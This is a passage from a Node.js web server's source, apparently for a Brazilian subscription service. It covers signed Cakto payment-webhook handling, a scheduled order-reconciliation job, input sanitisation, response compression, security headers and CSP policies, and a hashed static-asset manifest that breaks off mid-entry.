  if (!doc) return { ok: false, error: 'event_not_requeueable' };
  return { ok: true, queueRef: doc.queueRef || caktoQueueRef(doc.eventKey) };
}

function triggerCaktoWorker() {
  if (_caktoWorkerBusy || !CAKTO_WEBHOOK_SECRET) return;
  _caktoWorkerBusy = true;
  _caktoWorkerPromise = new Promise(resolve => setImmediate(resolve))
    .then(() => runCaktoWorkerOnce())
    .catch(e => { console.error('[CAKTO][WORKER] Execução falhou:', safeScalar(e.message, 80, 'worker_failed')); })
    .finally(() => { _caktoWorkerBusy = false; _caktoWorkerPromise = null; });
}

async function runCaktoRecoveryMonitorOnce() {
  if (_caktoRecoveryBusy || !CAKTO_READONLY_CLIENT_ID || !CAKTO_READONLY_CLIENT_SECRET || ZVM_LOCAL_SAFE_MODE) return;
  _caktoRecoveryBusy = true;
  try {
    const db = await getMongoDb();
    // Cakto authorizes GET /orders via OAuth scope "read orders".
    // Do not reuse merchant write credentials or mint a new token per order.
    const token = await getScopedToken(CAKTO_READONLY_CLIENT_ID, CAKTO_READONLY_CLIENT_SECRET);
    const result = await runMissingRenewalPass({
      token, db, now: new Date(), maxPages: 4, maxCandidates: 20,
      normalize: normalizeCaktoPurchase,
      resolvePlan: resolveCaktoPlan,
      validateIntegrity: validateCaktoCommercialIntegrity,
      enqueue: async (purchase, plan) => {
        const written = await enqueueCaktoPurchaseEvent(db, purchase, plan);
        if (written.queued) triggerCaktoWorker();
      }
    });
    console.log('[CAKTO][RECONCILE]', {
      pages: result.pages, seen: result.seen, recorded: result.existing,
      queued: result.alreadyQueued, recovered: result.enqueued,
      manualReview: result.review, reasons: result.blockedReasons,
      complete: result.complete
    });
  } catch (error) {
    // No provider payload or credentials in logs.
    const category = /cakto_[a-z0-9_]+/.test(String(error?.message||'')) ? String(error.message).slice(0,70) : 'operational_error';
    console.warn('[CAKTO][RECONCILE] unavailable:', category);
  } finally {
    _caktoRecoveryBusy = false;
  }
}
function startCaktoWorker() {
  if (ZVM_LOCAL_SAFE_MODE) return;
  if (!CAKTO_WEBHOOK_SECRET || _caktoWorkerTimer) return;
  triggerCaktoWorker();
  _caktoWorkerTimer = setInterval(triggerCaktoWorker, CAKTO_WORKER_POLL_MS);
  _caktoWorkerTimer.unref();
  if (CAKTO_READONLY_CLIENT_ID && CAKTO_READONLY_CLIENT_SECRET) {
    // Recent subscriptions only. Historical orders manually renewed are never
    // replayed automatically. Limits keep provider/API and Mongo load bounded.
    _caktoRecoveryStartupTimer = setTimeout(runCaktoRecoveryMonitorOnce, 180000);
    _caktoRecoveryStartupTimer.unref();
    _caktoRecoveryTimer = setInterval(runCaktoRecoveryMonitorOnce, 6 * 60 * 60 * 1000);
    _caktoRecoveryTimer.unref();
  } else {
    console.warn('[CAKTO][RECONCILE] read orders credentials absent; signed webhook path remains active');
  }
}

function caktoDryRunAllowed(opts = {}) {
  const production = opts.production === undefined ? IS_PRODUCTION : !!opts.production;
  const explicitEnable = opts.explicitEnable === undefined ? CAKTO_ALLOW_DRY_RUN : !!opts.explicitEnable;
  return !production || explicitEnable;
}

async function handleCaktoWebhook(req, res, url, ip, deps = {}) {
  const configuredSecret = deps.secret !== undefined ? deps.secret : CAKTO_WEBHOOK_SECRET;
  const rateLimit = deps.rateLimit || checkRateLimit;
  if (!rateLimit(ip, 'cakto')) { sendJson(res, { ok: false, error: 'rate_limited' }, 429); return; }
  if (!configuredSecret) {
    console.error('[CAKTO] CAKTO_WEBHOOK_SECRET não configurado — webhook recusado (fail-closed)');
    sendJson(res, { ok: false, error: 'webhook_disabled' }, 503); return;
  }
  const rawBody = await readRawBodyBuffer(req, WEBHOOK_BODY_SIZE);
  if (rawBody === null) { sendJson(res, { ok: false, error: 'payload_too_large' }, 413); return; }
  const signatureCheck = verifyCaktoSignature(
    rawBody,
    req.headers['x-cakto-timestamp'],
    req.headers['x-cakto-signature'],
    configuredSecret,
    deps.nowMs !== undefined ? deps.nowMs : Date.now()
  );
  if (!signatureCheck.ok) {
    addSecurityAlert('CAKTO_SIGNATURE_REJECTED', signatureCheck.error, ip);
    sendJson(res, { ok: false, error: signatureCheck.error }, signatureCheck.status); return;
  }
  let payload;
  try { payload = JSON.parse(rawBody.toString('utf8')); }
  catch { sendJson(res, { ok: false, error: 'invalid_payload' }, 400); return; }

  const validated = validateCaktoPayload(payload, configuredSecret);
  if (!validated.ok) { sendJson(res, { ok: false, error: validated.error }, validated.status); return; }
  const { purchase, plan } = validated;

  if (!isCaktoPaidEntitlementEvent(purchase.event)) {
    console.log('[CAKTO] Evento reconhecido e ignorado', { event: purchase.event || 'unknown', txRef: maskTransactionId(purchase.txId || '') });
    sendJson(res, { ok: true, ignored: true }); return;
  }
  if (!purchase.txId || !purchase.clientEmail || !/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(purchase.clientEmail)) {
    sendJson(res, { ok: false, error: 'invalid_purchase' }, 400); return;
  }
  const commercialCheck = validateCaktoCommercialIntegrity(purchase, plan);
  if (!commercialCheck.ok) {
    console.warn('[CAKTO][REJECT]', { txRef: maskTransactionId(purchase.txId), error: commercialCheck.error, planId: plan?.id || null });
    sendJson(res, { ok: false, error: commercialCheck.error }, commercialCheck.status); return;
  }

  if (url.searchParams.get('dry_run') === '1') {
    if (!caktoDryRunAllowed()) { sendJson(res, { ok: false, error: 'dry_run_disabled' }, 403); return; }
    // Diagnóstico completo pro primeiro payload real da Cakto — campos
    // comerciais/técnicos necessários pra configurar CAKTO_*_OFFER_ID/
    // PRODUCT_ID e confirmar o formato de amount (reais vs. centavos).
    // Nunca inclui secret/senha/token/PII crua — e-mail e telefone
    // mascarados (maskEmail/maskPhone, já usados em todo o projeto).
    const diagnostic = {
      event: purchase.event, txRef: maskTransactionId(purchase.txId), refRef: maskTransactionId(purchase.refId || ''),
      productId: purchase.productId || null, productShortId: purchase.productShortId || null,
      productName: purchase.productName || null,
      offerId: purchase.offerId || null, offerName: purchase.offerName || null,
      checkoutUrl: purchase.checkoutUrl || null,
      // amountRaw é só Number(data.amount) — nenhuma conversão reais/centavos
      // acontece em nenhum ponto do pipeline hoje, então amountNormalized é
      // idêntico por enquanto. amountRawType é o typeof do valor ANTES do
      // Number() — é o que confirma, no primeiro payload real, se a Cakto
      // manda number ou string, e se o valor já vem em reais (ex.: 39.9) ou
      // em centavos (ex.: 3990).
      amountRaw: purchase.amount, amountRawType: purchase.amountRawType, amountNormalized: purchase.amount,
      paymentMethod: purchase.paymentMethod || null, paidAt: purchase.paidAt || null,
      resolvedPlanId: plan?.id || null,
      email: maskEmail(purchase.clientEmail), phone: maskPhone(purchase.clientPhone),
    };
    console.log('[CAKTO][DRY-RUN]', diagnostic);
    sendJson(res, { ok: true, dryRun: true, planId: plan?.id || null, diagnostic }); return;
  }

  const indexReady = deps.indexReady !== undefined ? deps.indexReady : (deps.db ? true : _caktoIndexReady);
  if (!indexReady) {
    console.error('[CAKTO] Índice da fila indisponível — evento NÃO persistido; replay operacional obrigatório se a Cakto registrar a entrega como falha HTTP');
    addSecurityAlert('CAKTO_INGEST_NOT_PERSISTED', 'queue_index_unavailable_manual_replay_required', ip);
    sendJson(res, { ok: false, error: 'queue_unavailable', manualReplayRequired: true }, 503); return;
  }

  try {
    const db = deps.db || await getMongoDb();
    const queued = await enqueueCaktoPurchaseEvent(db, purchase, plan, { now: deps.now });
    sendJson(res, { ok: true, queued: !!queued.queued, duplicate: !!queued.duplicate, recovered: !!queued.recovered }, 202);
    if (!deps.db) triggerCaktoWorker();
  } catch (e) {
    const code = e?.code === 'cakto_queue_backpressure' ? 'queue_backpressure' : 'queue_unavailable';
    console.error('[CAKTO] Falha ao persistir evento antes do ACK; replay operacional pode ser necessário:', safeScalar(e.message, 120, 'queue_failed'));
    addSecurityAlert('CAKTO_INGEST_NOT_PERSISTED', `${code}_manual_replay_required`, ip);
    sendJson(res, { ok: false, error: code, manualReplayRequired: true }, 503);
  }
}

// Sanitiza IDs/códigos de chave: apenas a-z0-9 e hífen, max 40 chars
// Impede NoSQL injection via injeção de objeto ($where, $regex, etc.)
function sanitizeId(s, maxLen = 40) {
  // Flattens arrays/objects to string first (parameter pollution guard)
  if (Array.isArray(s)) s = s[0];
  if (s !== null && typeof s === 'object') s = '';
  return String(s || '').toLowerCase().replace(/[^a-z0-9\-]/g, '').slice(0, maxLen);
}

function _safeParse(raw) {
  try {
    const obj = JSON.parse(raw);
    if (obj && typeof obj === 'object' && !Array.isArray(obj)) {
      const hop = Object.prototype.hasOwnProperty;
      if (hop.call(obj,'__proto__') || hop.call(obj,'constructor') || hop.call(obj,'prototype')) return {};
      return obj;
    }
    return obj || {};
  } catch { return {}; }
}
function parseBody(req) {
  return new Promise((resolve) => {
    let b = '', size = 0;
    req.on('data', c => {
      size += c.length;
      if (size > MAX_BODY_SIZE) { req.destroy(); resolve({}); return; }
      b += c;
    });
    req.on('end', () => resolve(_safeParse(b)));
  });
}

function parseFormBody(req) {
  return new Promise((resolve) => {
    let b = '', size = 0;
    req.on('data', c => {
      size += c.length;
      if (size > MAX_BODY_SIZE) { req.destroy(); resolve(new URLSearchParams()); return; }
      b += c;
    });
    req.on('end', () => resolve(new URLSearchParams(b)));
  });
}

// Opções de compressão: Z_BEST_SPEED (nível 1) minimiza CPU sem sacrificar latência.
// Resposta zlib já é assíncrona (callback), não bloqueia o event loop.
const _ZLIB_OPTS = { level: zlib.constants.Z_BEST_SPEED };

function _encodingQuality(header, encoding) {
  const parts = String(header || '').split(',').map(part => part.trim()).filter(Boolean);
  let wildcard = null;
  for (const part of parts) {
    const bits = part.split(';').map(v => v.trim());
    const name = String(bits.shift() || '').toLowerCase();
    let q = 1;
    for (const param of bits) {
      const m = /^q\s*=\s*([0-9.]+)$/i.exec(param);
      if (m) { q = Math.max(0, Math.min(1, Number(m[1]) || 0)); break; }
    }
    if (name === String(encoding).toLowerCase()) return q;
    if (name === '*') wildcard = q;
  }
  return wildcard === null ? 0 : wildcard;
}

function _compressedSend(res, buf, status, acceptEncoding = '') {
  const brQ = _encodingQuality(acceptEncoding, 'br');
  const gzipQ = _encodingQuality(acceptEncoding, 'gzip');
  const fallback = () => { if (!res.destroyed) { res.writeHead(status); res.end(buf); } };
  if (brQ > 0 && brQ >= gzipQ) {
    zlib.brotliCompress(buf, { params: { [zlib.constants.BROTLI_PARAM_QUALITY]: 5 } }, (err, compressed) => {
      if (err || res.destroyed) { fallback(); return; }
      res.setHeader('Content-Encoding', 'br');
      res.setHeader('Content-Length', compressed.length);
      res.writeHead(status);
      res.end(compressed);
    });
    return;
  }
  if (gzipQ > 0) {
    zlib.gzip(buf, _ZLIB_OPTS, (err, compressed) => {
      if (err || res.destroyed) { fallback(); return; }
      res.setHeader('Content-Encoding', 'gzip');
      res.setHeader('Content-Length', compressed.length);
      res.writeHead(status);
      res.end(compressed);
    });
    return;
  }
  fallback();
}

const _SEC_HEADERS = {
  'X-Content-Type-Options': 'nosniff',
  'X-Frame-Options': 'DENY',
  'X-XSS-Protection': '0',
  'Cross-Origin-Opener-Policy': 'same-origin',
  'Cross-Origin-Resource-Policy': 'same-origin',
  'Origin-Agent-Cluster': '?1',
  'Referrer-Policy': 'no-referrer',
  'Permissions-Policy': 'camera=(), microphone=(), geolocation=()',
  'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
  // frame-src/media-src precisam citar o YouTube: sem eles o iframe do tutorial cai
  // no default-src 'self' e o navegador bloqueia com ERR_BLOCKED_BY_CSP.
  'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; font-src 'self' data:; img-src 'self' data: https://pps.whatsapp.net https://i.ytimg.com; connect-src 'self'; frame-src 'self' https://www.youtube.com https://www.youtube-nocookie.com; child-src 'self' https://www.youtube.com https://www.youtube-nocookie.com; media-src 'self' https://www.youtube.com https://www.youtube-nocookie.com; frame-ancestors 'none'; object-src 'none'; base-uri 'none'; form-action 'self'; upgrade-insecure-requests",
  'Server': 'ZVM',
};

const _CSP_PUBLIC_STRICT = "default-src 'self'; script-src 'self'; style-src 'self'; font-src 'self' data:; img-src 'self' data: https://pps.whatsapp.net https://i.ytimg.com; connect-src 'self'; frame-src 'self' https://www.youtube.com https://www.youtube-nocookie.com; child-src 'self' https://www.youtube.com https://www.youtube-nocookie.com; media-src 'self' https://www.youtube.com https://www.youtube-nocookie.com; frame-ancestors 'none'; object-src 'none'; base-uri 'none'; form-action 'self'; upgrade-insecure-requests";
const _CSP_AUTH_STRICT = "default-src 'self'; script-src 'self'; style-src 'self'; font-src 'self' data:; img-src 'self' data:; connect-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'none'; form-action 'self'; upgrade-insecure-requests";

// Assets públicos versionados por conteúdo. Rotas explícitas: sem servidor estático
// genérico e sem possibilidade de path traversal. O hash no nome permite cache
// imutável por 1 ano sem risco de servir uma imagem antiga após atualização.
const _PUBLIC_ASSETS = Object.freeze({
  '/assets/zvm-brand.167357885820.png': Object.freeze({
    type: 'image/png',
    file: path.join(__dirname, 'assets', 'zvm-brand.167357885820.png'),
    sha256: '16735788582078e978a4fa802da332c90b96b9172bbcfa88bce7d407fee783ce',
  }),
  '/assets/lr1290-avatar.313ed8884277.png': Object.freeze({
    type: 'image/png',
    file: path.join(__dirname, 'assets', 'lr1290-avatar.313ed8884277.png'),
    sha256: '313ed88842775c4b3d2a44f67df79d3961f240fca66587d26dc0e046feb529e8',
  }),
  '/assets/zvm-shared.6dac16eb7b5b.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-shared.6dac16eb7b5b.css'),
    sha256: '6dac16eb7b5b103668a2350e94d0e0fcb75c5f3e93051a7626bee286375dcfd6',
    compressible: true,
  }),
  '/assets/zvm-r46-system.aa366d924866.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-r46-system.aa366d924866.css'),
    sha256: 'aa366d92486687fb82d3e3dc17f5f846c204f1b3ac799b76d6c7a427932306cf',
    compressible: true,
  }),
  '/assets/zvm-standalone.d6d2222fe00a.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-standalone.d6d2222fe00a.css'),
    sha256: 'd6d2222fe00a952abffb4db44498378fc446af76111cdf9f1980c177b78a0c70',
    compressible: true,
  }),
  '/assets/zvm-action-hub.07aa17b87c3e.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-action-hub.07aa17b87c3e.css'),
    sha256: '07aa17b87c3e2234cd0b335eb7b9abc2a7f9a839281567a1f37fbfe2d88277e1',
    compressible: true,
  }),
  '/assets/zvm-privileged-auth.daab7ea4861a.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-privileged-auth.daab7ea4861a.css'),
    sha256: 'daab7ea4861a6827a867397635cb831f5194a00ed62ccb975b54d922f5901e51',
    compressible: true,
  }),
  '/assets/zvm-r46-auth.286cb26442a2.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-r46-auth.286cb26442a2.css'),
    sha256: '286cb26442a26e5ee52f0a59066aadab9d1a58db8ab11ee2c3fb2c209b776021',
    compressible: true,
  }),
  '/assets/zvm-r46-client-workspace.6dbf0f685e67.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-r46-client-workspace.6dbf0f685e67.css'),
    sha256: '6dbf0f685e67e16999a9821bd4fab3cdf4ad3c2697a94940c22ab8b5048db92a',
    compressible: true,
  }),
  '/assets/zvm-password-toggle.f779f56bc8f1.js': Object.freeze({
    type: 'text/javascript; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-password-toggle.f779f56bc8f1.js'),
    sha256: 'f779f56bc8f14fcbe6e3000da9703af554d6b94ca5b1cbc3b2d1e32d54f551d3',
    compressible: true,
  }),
  '/assets/zvm-auth-submit-lock.c4dfbde1ba00.js': Object.freeze({
    type: 'text/javascript; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-auth-submit-lock.c4dfbde1ba00.js'),
    sha256: 'c4dfbde1ba002f3ee13fc4806bb210505eb874dabf521bce61df7f2a1a8fc228',
    compressible: true,
  }),
  '/assets/zvm-nav.d7d7bba83d44.js': Object.freeze({
    type: 'text/javascript; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-nav.d7d7bba83d44.js'),
    sha256: 'd7d7bba83d4424fe90de4ba00d1c1ea627607a8cb56e0bee7a2590346aa27369',
    compressible: true,
  }),
  '/assets/zvm-plans.3d82262649b9.js': Object.freeze({
    type: 'text/javascript; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-plans.3d82262649b9.js'),
    sha256: '3d82262649b9e75c7943b07f6f39088f66810346fdd142023afd3cbe8b9bccad',
    compressible: true,
  }),
  '/assets/zvm-shell-home-real.a9c1a0d7b030.png': Object.freeze({
    type: 'image/png',
    file: path.join(__dirname, 'assets', 'zvm-shell-home-real.a9c1a0d7b030.png'),
    sha256: 'a9c1a0d7b030333d0e9240228f11e34ef7a1e94be3b9763e18a621bb487de8b5',
  }),
  '/assets/zvm-home-connections.2a3c9faa94ec.png': Object.freeze({
    type: 'image/png',
    file: path.join(__dirname, 'assets', 'zvm-home-connections.2a3c9faa94ec.png'),
    sha256: '2a3c9faa94ecd1faf08c81c748d35e5340a96e531f46f524363cf986707b7061',
  }),
  '/assets/zvm-home-favorites.ce590e486f02.png': Object.freeze({
    type: 'image/png',
    file: path.join(__dirname, 'assets', 'zvm-home-favorites.ce590e486f02.png'),
    sha256: 'ce590e486f02c0a69a583d6ab4d32fe301587beddcb7ee435ad82e6a6f0090af',
  }),
  '/assets/zvm-home-metrics.40db3ea20ff3.png': Object.freeze({
    type: 'image/png',
    file: path.join(__dirname, 'assets', 'zvm-home-metrics.40db3ea20ff3.png'),
    sha256: '40db3ea20ff3d76465567da423e3ad586bba122de7828f709699343956664aa1',
  }),
  '/assets/zvm-home-models.7cdf6ab7bc37.png': Object.freeze({
    type: 'image/png',
    file: path.join(__dirname, 'assets', 'zvm-home-models.7cdf6ab7bc37.png'),
    sha256: '7cdf6ab7bc37e71ad74b38260102c8fd8a6cb527bb98da2bff8d694ebb60e6da',
  }),
  '/assets/zvm-home-status.d67c284e8b99.png': Object.freeze({
    type: 'image/png',
    file: path.join(__dirname, 'assets', 'zvm-home-status.d67c284e8b99.png'),
    sha256: 'd67c284e8b99a9641028b728dd21cfd5d2e102d2837b345331bf0bd41bd89556',
  }),
  '/assets/zvm-shell-header-real.3111679a48e4.png': Object.freeze({
    type: 'image/png',
    file: path.join(__dirname, 'assets', 'zvm-shell-header-real.3111679a48e4.png'),
    sha256: '3111679a48e4555b255196f9620efbfeef521e968342e3bf9dc28eaf83ef4770',
  }),
  '/assets/zvm-r46-landing-navigation.8996142ec21d.js': Object.freeze({
    type: 'application/javascript; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-r46-landing-navigation.8996142ec21d.js'),
    sha256: '8996142ec21d4769e5df12a06bafc7d80f748e9a6e698de5632737d272f857de',
    compressible: true,
  }),
  '/assets/zvm-owner-site.42d17a62234b.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-owner-site.42d17a62234b.css'),
    sha256: '42d17a62234b677c088e216baa0565ec3edc192f3345ac74661034405b1e2da8',
    compressible: true,
  }),
  '/assets/zvm-sales-owner.76ccce3f6669.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-sales-owner.76ccce3f6669.css'),
    sha256: '76ccce3f666924644952fd3cce80e6bf881768526e360bdb76798a1da10eac5d',
    compressible: true,
  }),
  '/assets/zvm-r46-landing.af4c6e5c623b.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-r46-landing.af4c6e5c623b.css'),
    sha256: 'af4c6e5c623bd959f534f459e5052088fcad6c1eb9ada735dd1c38c687067ccb',
    compressible: true,
  }),
  '/assets/zvm-faq.b388ca55cbf4.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-faq.b388ca55cbf4.css'),
    sha256: 'b388ca55cbf498b6d3f333f98398a5fd57ab4237db9880268a0e48d41c4015b8',
    compressible: true,
  }),
  '/assets/zvm-privacy.7be30b7da0a1.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-privacy.7be30b7da0a1.css'),
    sha256: '7be30b7da0a12b9f4e2aa8d447529c9cf3f1da7e1a3b0e2500d74c4bb46e751a',
    compressible: true,
  }),
  '/assets/zvm-terms.f1c470efdbbb.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-terms.f1c470efdbbb.css'),
    sha256: 'f1c470efdbbbdffa93c1fa09ab4f516b2634e495aba755cdaf5aabbf206af00a',
    compressible: true,
  }),
  '/assets/zvm-plans-page.9dcee339fb9b.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-plans-page.9dcee339fb9b.css'),
    sha256: '9dcee339fb9ba235cd21088771edac878b3fddb006270d8304e2c09f348afcd9',
    compressible: true,
  }),
  '/assets/zvm-error-404.bea758f1e983.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-error-404.bea758f1e983.css'),
    sha256: 'bea758f1e9833ca1cb60ffe44c19d76a1afc71055272c22ef9923e7986b52ccf',
    compressible: true,
  }),
  '/assets/zvm-error-500.c2528a1f4a3c.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-error-500.c2528a1f4a3c.css'),
    sha256: 'c2528a1f4a3cfca0a84ba30da98930814263d65d5018dbab64254c00fe8e5718',
    compressible: true,
  }),

  '/assets/zvm-admin-dashboard.cd85ea19cc73.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-admin-dashboard.cd85ea19cc73.css'),
    sha256: 'cd85ea19cc732fd85c921d00d0bee6f0939940b5c000b67c6e53e3075d66a0bc',
    compressible: true,
  }),
  '/assets/zvm-admin-dashboard.5c649db2edf7.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-admin-dashboard.5c649db2edf7.css'),
    sha256: '5c649db2edf7202864b1a9f9afd96f35a4d9fd609f8b31bc002d10b9dbe9ef94',
    compressible: true,
  }),
  '/assets/zvm-admin-dashboard.c06071e4d73f.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-admin-dashboard.c06071e4d73f.css'),
    sha256: 'c06071e4d73ffd64f8010881eb91c9e43a493457105e03c352153a4c7f030c1a',
    compressible: true,
  }),
  '/assets/zvm-auth-premium.a96f915db3f4.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-auth-premium.a96f915db3f4.css'),
    sha256: 'a96f915db3f4102b08fc53c39a66a3c1fbeffc0a017d09c0697c1f9c5976f020',
    compressible: true,
  }),
  '/assets/zvm-public-premium.ab131a22bcdd.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-public-premium.ab131a22bcdd.css'),
    sha256: 'ab131a22bcdd11998b7564618bc24d7159f2ffd1fbece5c2475350d3a446404a',
    compressible: true,
  }),
  '/assets/zvm-legal-premium.a828eee21356.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-legal-premium.a828eee21356.css'),
    sha256: 'a828eee213564319d2ca10241ce281301f9e33b364152aac47a1e29baa8af1c5',
    compressible: true,
  }),
  '/assets/zvm-analytics-premium.e8ce624836b1.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-analytics-premium.e8ce624836b1.css'),
    sha256: 'e8ce624836b1715d4dd8d4d44c73563e2aa2250f74f0990b9020ff0f0d3b3ef6',
    compressible: true,
  }),
  '/assets/zvm-analytics-dashboard.95454273c23e.js': Object.freeze({
    type: 'text/javascript; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-analytics-dashboard.95454273c23e.js'),
    sha256: '95454273c23ec440f8c6b4400652772c1519a56fe6caeb86928a1d7a6eb78769',
    compressible: true,
  }),
  '/assets/zvm-analytics-lab.e6a44a6e8392.js': Object.freeze({
    type: 'text/javascript; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-analytics-lab.e6a44a6e8392.js'),
    sha256: 'e6a44a6e83929ba9d2c1d1768f31e1069d0d9f756b7526264dd56d569c2abddf',
    compressible: true,
  }),
  '/assets/zvm-sales-state.1422fd551ff5.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-sales-state.1422fd551ff5.css'),
    sha256: '1422fd551ff5c1548fc1f7641a22263662755331d928eaaa0ff29f25f30931f9',
    compressible: true,
  }),
  '/assets/zvm-public-experience.b95326ae9de7.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-public-experience.b95326ae9de7.css'),
    sha256: 'b95326ae9de7ae949428a2ae00cd925287f523a9c44a8a1a0a2d25f1d2506c7e',
    compressible: true,
  }),
  '/assets/zvm-faq-experience.5cf1ddccd700.js': Object.freeze({
    type: 'text/javascript; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-faq-experience.5cf1ddccd700.js'),
    sha256: '5cf1ddccd70018f9b6ca96b3b61a4ef55a09b1782a7193c080b2b247ea6b191e',
    compressible: true,
  }),
  '/assets/zvm-reference-public.19040fd11331.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-reference-public.19040fd11331.css'),
    sha256: '19040fd113310e45c7f9096fdb75aece8f7a82a9cc5496781405fad178e2805b',
    compressible: true,
  }),
  '/assets/zvm-console-design.44762cb103f8.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-console-design.44762cb103f8.css'),
    sha256: '44762cb103f86784b9a7ad5dccf99b5ec304076e728f5dac1bb7875631cb7349',
    compressible: true,
  }),
  '/assets/zvm-admin-dashboard.b892a520f957.js': Object.freeze({
    type: 'text/javascript; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-admin-dashboard.b892a520f957.js'),
    sha256: 'b892a520f95748f7f030d6b4fc78e7b12506336e219ac2ecab220478133c9e3d',
    compressible: true,
  }),
  '/assets/zvm-admin-dashboard.3bcd52923d5c.js': Object.freeze({
    type: 'text/javascript; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-admin-dashboard.3bcd52923d5c.js'),
    sha256: '3bcd52923d5c079c9ef24ec7253d799e831a648654061046f5d628ed84ccf295',
    compressible: true,
  }),
  '/assets/zvm-admin-dashboard.139cf6e868d9.js': Object.freeze({
    type: 'text/javascript; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-admin-dashboard.139cf6e868d9.js'),
    sha256: '139cf6e868d9e8cf10958c6171a8cdfa313c9c8eb365011ea6cfd97d50c80a55',
    compressible: true,
  }),
  '/assets/zvm-admin-dashboard.adbd0ce88968.js': Object.freeze({
    type: 'text/javascript; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-admin-dashboard.adbd0ce88968.js'),
    sha256: 'adbd0ce889680f8becb81c12ce5e70f4c09e4dd71771d868ebeb99523616cf9b',
    compressible: true,
  }),
  '/assets/zvm-admin-dashboard.91efd97cea20.js': Object.freeze({
    type: 'text/javascript; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-admin-dashboard.91efd97cea20.js'),
    sha256: '91efd97cea203bf0d151777c286979cd8eb6d12199cb4fc58310726ae1310922',
    compressible: true,
  }),
  '/assets/zvm-admin-dashboard.bc01cf565fa7.js': Object.freeze({
    type: 'text/javascript; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-admin-dashboard.bc01cf565fa7.js'),
    sha256: 'bc01cf565fa774b67cf39ae88a5eb013e114ac08ab73cd5735feb8076811c913',
    compressible: true,
  }),
  '/assets/zvm-admin-dashboard.db80ba5884d9.js': Object.freeze({
    type: 'text/javascript; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-admin-dashboard.db80ba5884d9.js'),
    sha256: 'db80ba5884d997b646b13a0e742422ccddb803e5c15771b8d0e5b399994371a2',
    compressible: true,
  }),
  '/assets/zvm-admin-dashboard.ba75b250f87b.js': Object.freeze({
    type: 'text/javascript; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-admin-dashboard.ba75b250f87b.js'),
    sha256: 'ba75b250f87be36e25109c52845afb0ca15a022cd21bc924bb776bb2ba65ce6c',
    compressible: true,
  }),
  '/assets/zvm-analytics-dashboard.623a7bbac134.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-analytics-dashboard.623a7bbac134.css'),
    sha256: '623a7bbac134712dcc57feb6098ed81d2bbc0dd01507904244153201524ebcd8',
    compressible: true,
  }),

  '/assets/zvm-analytics-lab.40519085ae68.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-analytics-lab.40519085ae68.css'),
    sha256: '40519085ae6895ae5b5bfe7ef13ffb894a9a04123c69cf681b91223e2cb1c190',
    compressible: true,
  }),

  '/assets/zvm-r46-client-dashboard.64213392bec3.css': Object.freeze({
    type: 'text/css; charset=utf-8',
    file: path.join(__dirname, 'assets', 'zvm-r46-client-dashboard.64213392bec3.css'),
